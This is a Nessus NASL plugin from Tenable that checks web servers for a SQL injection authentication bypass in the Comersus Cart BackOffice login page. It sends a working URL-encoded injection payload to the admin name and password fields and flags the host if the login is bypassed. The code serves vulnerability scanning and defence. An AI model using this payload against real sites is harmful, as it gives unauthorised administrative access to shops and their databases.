#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20131);
  script_version("$Revision: 1.21 $");

  script_bugtraq_id(15251);
  script_osvdb_id(49528);

  script_name(english:"Comersus BackOffice comersus_backoffice_menu.asp Multiple Parameter SQL Injection");
  script_summary(english:"Checks for administrator authentication bypass vulnerability in Comersus BackOffice");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP application that is prone to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running Comersus Cart, an ASP shopping
cart application. 

The version of Comersus Cart installed on the remote host fails to
sanitize input to the 'adminName' and 'adminpassword' fields of the
'backofficeLite/comersus_backoffice_menu.asp' script before using them
in a database query.  An unauthenticated, remote attacker can leverage
this issue to bypass authentication and gain administrative access to
the application or launch other attacks against the affected
application and its underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c57730db" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/11/02");
 script_cvs_date("$Date: 2011/08/24 16:52:33 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/ASP");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_asp(port:port)) exit(0);

init_cookiejar();

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/comersus", "/store", "/shop", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  foreach prod (make_list("backofficeLite", "backofficePlus")) {
    # Check whether the script exists.
    r = http_send_recv3(method: 'GET', item:string(dir, "/", prod, "/comersus_backoffice_index.asp"), port:port);
    if (isnull(r)) exit(0);

    # If we have a session cookie...
    if (egrep(pattern: "Set-Cookie.*:.*ASPSESSIONID", string: r[1]))
    {
      # Try to exploit the flaw.
      exploit = "%27+OR+adminpassword+%3C%3E+%27%27+OR+adminpassword+%3D+%27";
      postdata = string(
        "adminName=", exploit, "&",
        "adminpassword=", exploit, "&",
        "Submit2=Login"
      );
      r = http_send_recv3(method: 'POST', version: 11, data: postdata,
  item: dir+"/backofficeLite/comersus_backoffice_menu.asp", port: port,
  add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
      if (isnull(r)) exit(0);

      # There's a problem if it looks like we're getting in.
      if (egrep(pattern:"^Location: +comersus_backoffice_menu.asp?lastLogin=", string: r[1])) {
        security_hole(port);
	set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
        exit(0);
      }
    }
  }
}
